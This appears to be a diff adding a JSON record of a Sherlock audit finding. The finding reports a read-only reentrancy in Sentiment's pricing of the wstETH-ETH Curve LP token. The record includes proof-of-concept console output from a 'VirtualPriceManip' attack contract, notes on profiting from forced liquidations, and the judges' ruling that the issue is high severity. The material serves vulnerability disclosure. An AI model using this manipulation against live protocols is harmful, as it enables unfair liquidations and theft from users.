  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n> \n> Transaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n>   TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n> \n> Transaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n>   VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n> \n> Transaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n>   VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n> \n> >>> history[-1].events\n> {'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n> ```\n> \n> More specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n> >>> 1006386728989215731 / 566156151085517748\n> 1.777578018113242\n> >>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n> 43.743678769080375\n> \n> Also agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted \n\nBased on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\n**sherlock-admin**\n\n> Escalation accepted \n> \n> Based on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
+      "summary": "\nThis bug report is about the wstETH-ETH Curve LP token, which is priced via its `virtual_price`. Through what Chainalysis called View only Reentrancy, it is possible to reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event. Testing has shown that the debt for such an account is denominated in WETH, and the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function. This is possible because the function will send ETH first, before updating its internal wstETH balances. With a big enough deposit, it becomes profitable to force liquidate them, and the estimated cost of the attack is 60 BPS of the total ETH used (due to price impact). The impact of this vulnerability is that it can trigger unfair liquidations to the attacker's advantage. A code snippet and a Brownie Console were provided to demonstrate the maximum theoretical attack. The judges consulted the Lead senior and concluded that this issue is a valid high. Contestants' payouts and scores will be updated according to the changes made on this issue.",
+      "report_date": {},
+      "contest_prize_txt": "10000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/28",
+      "sponsor_name": "Sentiment",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "28",
+      "slug": "h-1-h-01-wsteth-eth-curve-lp-token-price-can-be-manipulated-to-cause-unexpected-liquidations-sherlock-sentiment-sentiment-update-2-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Sentiment Update #2",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Sentiment Update #2",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Liquid Staking"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "RWA Lending"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        }
+      ]
+    }
+  ]
+}
